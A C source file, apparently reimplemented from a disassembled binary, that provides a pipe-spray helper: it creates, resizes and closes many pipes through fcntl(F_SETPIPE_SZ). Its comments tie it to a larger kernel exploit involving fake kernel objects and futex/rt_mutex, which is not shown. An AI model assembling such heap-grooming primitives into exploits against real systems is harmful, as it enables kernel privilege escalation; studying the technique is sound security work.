/* source: FUN_00107d18/FUN_00107d50/FUN_00107ce8 + FUN_00107dd4's
 * opening/resize loops (raw disasm, docs/kernel-reference/README.md).
 * Pure pipe()/fcntl(F_SETPIPE_SZ) mechanics -- no fake kernel objects,
 * no futex/rt_mutex involvement. Safe to exercise on real hardware on
 * its own. */
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

#include "pipe_spray.h"

#define OSS_F_SETPIPE_SZ 0x407 /* confirmed via raw disasm: fcntl op 1031 */
#define OSS_PAGE_SIZE 4096

/* source: FUN_00107ce8 -- `iVar1 = fcntl(fd, 0x407, pages<<12); if
 * (iVar1 != -1) return;` i.e. success is "not -1", matching real
 * fcntl(F_SETPIPE_SZ) semantics: on success it returns the resulting
 * pipe size in bytes (a large positive number, NOT 0). Returns 1 on
 * success, 0 on failure -- callers must not treat the raw fcntl return
 * value as a 0/nonzero flag (an earlier version of this file did
 * exactly that and failed every call; caught by actually running the
 * host-side test before shipping this). */
static int set_pipe_size(int fd, int pages) {
  return fcntl(fd, OSS_F_SETPIPE_SZ, pages * OSS_PAGE_SIZE) != -1;
}

size_t pipe_spray_create(size_t count, int *read_fds, int *write_fds) {
  size_t created = 0;
  for (size_t i = 0; i < count; i++) {
    int fds[2];
    if (pipe(fds) != 0) {
      fprintf(stderr, "[pipe_spray] pipe() failed at i=%zu errno=%d\n", i,
              errno);
      read_fds[i] = -1;
      write_fds[i] = -1;
      continue;
    }
    if (!set_pipe_size(fds[0], 2)) {
      fprintf(stderr, "[pipe_spray] F_SETPIPE_SZ(2 pages) failed at i=%zu errno=%d\n",
              i, errno);
      close(fds[0]);
      close(fds[1]);
      read_fds[i] = -1;
      write_fds[i] = -1;
      continue;
    }
    read_fds[i] = fds[0];
    write_fds[i] = fds[1];
    created++;
  }
  return created;
}

size_t pipe_spray_resize_all(size_t count, const int *read_fds, int pages) {
  size_t resized = 0;
  for (size_t i = 0; i < count; i++) {
    if (read_fds[i] < 0) {
      continue;
    }
    if (!set_pipe_size(read_fds[i], pages)) {
      fprintf(stderr, "[pipe_spray] F_SETPIPE_SZ(%d pages) failed at i=%zu errno=%d\n",
              pages, i, errno);
      continue;
    }
    resized++;
  }
  return resized;
}

void pipe_spray_close_all(size_t count, int *read_fds, int *write_fds) {
  for (size_t i = 0; i < count; i++) {
    if (read_fds[i] >= 0) {
      close(read_fds[i]);
      read_fds[i] = -1;
    }
    if (write_fds[i] >= 0) {
      close(write_fds[i]);
      write_fds[i] = -1;
    }
  }
}
